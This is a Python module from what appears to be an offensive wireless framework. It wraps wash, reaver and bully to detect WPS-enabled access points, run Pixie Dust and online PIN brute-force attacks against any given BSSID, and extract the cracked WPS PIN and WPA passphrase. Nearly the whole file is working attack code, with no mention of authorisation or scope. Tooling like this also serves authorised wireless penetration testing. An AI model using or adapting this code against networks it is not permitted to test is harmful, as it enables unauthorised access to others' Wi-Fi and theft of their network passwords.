"""
WPS Attack Integration
──────────────────────
WPS PIN brute-force and Pixie Dust attacks via reaver, bully, and pixiewps.

Capabilities:
  - WPS-enabled AP detection (wash)
  - Online PIN brute-force (reaver/bully)
  - Offline Pixie Dust attack (pixiewps via reaver -K)
  - WPS lockout detection and rate limiting
"""

import os
import re
import signal
import subprocess
import time
from typing import Optional, List, Dict, Tuple

from posframework.config import log
from posframework.tools import is_available, which, run_tool, run_tool_background


class WPSScanner:
    """
    Scan for WPS-enabled access points using wash.

    Usage:
        scanner = WPSScanner("wlan0mon")
        aps = scanner.scan(timeout=30)
        for ap in aps:
            print(f"{ap['bssid']} - {ap['ssid']} - WPS {ap['version']} - Locked: {ap['locked']}")
    """

    def __init__(self, interface: str):
        if not is_available("wash"):
            raise FileNotFoundError("wash not installed (part of reaver package)")
        self.interface = interface

    def scan(self, timeout: int = 30, channel: Optional[int] = None) -> List[Dict]:
        """
        Scan for WPS-enabled APs.

        Args:
            timeout: Scan duration in seconds.
            channel: Lock to specific channel (None = all).

        Returns:
            List of WPS-enabled APs with bssid, ssid, channel, version, locked status.
        """
        args = ["-i", self.interface]
        if channel:
            args.extend(["-c", str(channel)])

        try:
            result = run_tool("wash", args, timeout=timeout)
            return self._parse_wash_output(result.stdout + result.stderr)
        except subprocess.TimeoutExpired:
            # wash runs until timeout — expected
            return []
        except Exception as e:
            log.error(f"wash scan failed: {e}")
            return []

    def _parse_wash_output(self, output: str) -> List[Dict]:
        """Parse wash output into structured data."""
        results = []
        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("BSSID") or line.startswith("---"):
                continue

            # wash output format: BSSID Ch dBm WPS Lck Vendor ESSID
            parts = line.split()
            if len(parts) >= 6:
                mac_match = re.match(r"([0-9A-Fa-f:]{17})", parts[0])
                if mac_match:
                    results.append({
                        "bssid": parts[0].upper(),
                        "channel": int(parts[1]) if parts[1].isdigit() else 0,
                        "rssi": int(parts[2]) if parts[2].lstrip("-").isdigit() else -100,
                        "version": parts[3],
                        "locked": parts[4].lower() in ("yes", "1", "locked"),
                        "ssid": " ".join(parts[6:]) if len(parts) > 6 else parts[5],
                    })
        return results


class ReaverAttack:
    """
    WPS PIN brute-force via reaver.

    Supports online PIN cracking and Pixie Dust (offline) attack.

    Usage:
        attacker = ReaverAttack("wlan0mon")

        # Pixie Dust (fast, offline)
        result = attacker.pixie_dust("AA:BB:CC:DD:EE:FF", channel=6)

        # Full brute-force (slow, 4-11 hours)
        result = attacker.brute_force("AA:BB:CC:DD:EE:FF", channel=6)
    """

    def __init__(self, interface: str):
        if not is_available("reaver"):
            raise FileNotFoundError(
                "reaver not installed. Install: apt-get install reaver"
            )
        self.interface = interface
        self._proc: Optional[subprocess.Popen] = None

    def pixie_dust(
        self,
        bssid: str,
        channel: int,
        timeout: int = 120,
    ) -> Optional[Dict[str, str]]:
        """
        Pixie Dust attack — offline WPS PIN recovery.

        Uses a vulnerability in certain WPS implementations that allows
        the PIN to be computed from the first M3 message exchange.
        Works in seconds against vulnerable APs (Ralink, Broadcom, Realtek).

        Args:
            bssid: Target AP BSSID.
            channel: Target AP channel.
            timeout: Max seconds (usually completes in <30s if vulnerable).

        Returns:
            Dict with 'pin' and 'psk' if successful, None otherwise.
        """
        args = [
            "-i", self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-K",           # Pixie Dust attack
            "-vv",          # Verbose (needed to parse output)
            "-N",           # No NACK (faster)
            "-d", "0",      # No delay between attempts
            "-T", "1",      # Timeout for waiting (1 second)
        ]

        log.info(f"Pixie Dust attack on {bssid} ch{channel}...")

        try:
            result = run_tool("reaver", args, timeout=timeout)
            return self._parse_reaver_output(result.stdout + result.stderr)
        except subprocess.TimeoutExpired:
            log.info("Pixie Dust timed out (AP may not be vulnerable)")
        except Exception as e:
            log.error(f"reaver pixie dust failed: {e}")

        return None

    def brute_force(
        self,
        bssid: str,
        channel: int,
        pin: Optional[str] = None,
        delay: float = 1.0,
        timeout: Optional[int] = None,
        max_attempts: int = 11000,
    ) -> Optional[Dict[str, str]]:
        """
        Online WPS PIN brute-force.

        Tries all possible 8-digit PINs (11,000 combinations due to checksum).
        Can take 4-11 hours depending on AP rate limiting.

        Args:
            bssid: Target AP BSSID.
            channel: Target AP channel.
            pin: Start with specific PIN (resume from previous attempt).
            delay: Seconds between attempts (higher = avoid lockout).
            timeout: Max total runtime (None = until complete).
            max_attempts: Max PIN attempts before giving up.

        Returns:
            Dict with 'pin' and 'psk' if successful, None otherwise.
        """
        args = [
            "-i", self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-vv",
            "-d", str(int(delay)),
            "-l", str(max_attempts),
            "-N",           # No NACK
        ]

        if pin:
            args.extend(["-p", pin])

        log.info(f"WPS brute-force on {bssid} ch{channel} (delay={delay}s)...")

        try:
            result = run_tool("reaver", args, timeout=timeout)
            return self._parse_reaver_output(result.stdout + result.stderr)
        except subprocess.TimeoutExpired:
            log.info("WPS brute-force timed out")
        except Exception as e:
            log.error(f"reaver brute-force failed: {e}")

        return None

    def _parse_reaver_output(self, output: str) -> Optional[Dict[str, str]]:
        """Parse reaver output for PIN and PSK."""
        result = {}

        pin_match = re.search(r"WPS PIN:\s*'?(\d{8})'?", output)
        if pin_match:
            result["pin"] = pin_match.group(1)

        psk_match = re.search(r"WPA PSK:\s*'(.+?)'", output)
        if psk_match:
            result["psk"] = psk_match.group(1)

        if result:
            log.critical(f"WPS CRACKED: PIN={result.get('pin')} PSK={result.get('psk')}")
            return result

        # Check for lockout
        if "WPS transaction failed" in output or "WARNING: Detected AP rate limiting" in output:
            log.warning("WPS rate limiting detected — AP may lock out")

        return None


class BullyAttack:
    """
    Alternative WPS brute-force via bully (sometimes works when reaver fails).

    Bully uses a different implementation that handles some edge cases
    better than reaver (certain Broadcom/Realtek chipsets).
    """

    def __init__(self, interface: str):
        if not is_available("bully"):
            raise FileNotFoundError(
                "bully not installed. Install: apt-get install bully"
            )
        self.interface = interface

    def pixie_dust(
        self,
        bssid: str,
        channel: int,
        timeout: int = 120,
    ) -> Optional[Dict[str, str]]:
        """
        Pixie Dust via bully.

        Args:
            bssid: Target BSSID.
            channel: Target channel.
            timeout: Max seconds.

        Returns:
            Dict with pin/psk or None.
        """
        args = [
            self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-d",           # Pixie Dust
            "-v", "3",      # Verbose
        ]

        log.info(f"bully Pixie Dust on {bssid} ch{channel}...")

        try:
            result = run_tool("bully", args, timeout=timeout)
            return self._parse_bully_output(result.stdout + result.stderr)
        except subprocess.TimeoutExpired:
            log.info("bully Pixie Dust timed out")
        except Exception as e:
            log.error(f"bully failed: {e}")

        return None

    def brute_force(
        self,
        bssid: str,
        channel: int,
        timeout: Optional[int] = None,
    ) -> Optional[Dict[str, str]]:
        """Online WPS brute-force via bully."""
        args = [
            self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-v", "3",
        ]

        try:
            result = run_tool("bully", args, timeout=timeout)
            return self._parse_bully_output(result.stdout + result.stderr)
        except subprocess.TimeoutExpired:
            log.info("bully brute-force timed out")
        except Exception as e:
            log.error(f"bully failed: {e}")

        return None

    def _parse_bully_output(self, output: str) -> Optional[Dict[str, str]]:
        """Parse bully output."""
        result = {}

        pin_match = re.search(r"Pin found:\s*(\d{8})", output)
        if pin_match:
            result["pin"] = pin_match.group(1)

        psk_match = re.search(r"Pass(?:word|phrase):\s*(.+)", output)
        if psk_match:
            result["psk"] = psk_match.group(1).strip()

        if result:
            log.critical(f"WPS CRACKED (bully): PIN={result.get('pin')} PSK={result.get('psk')}")
            return result

        return None
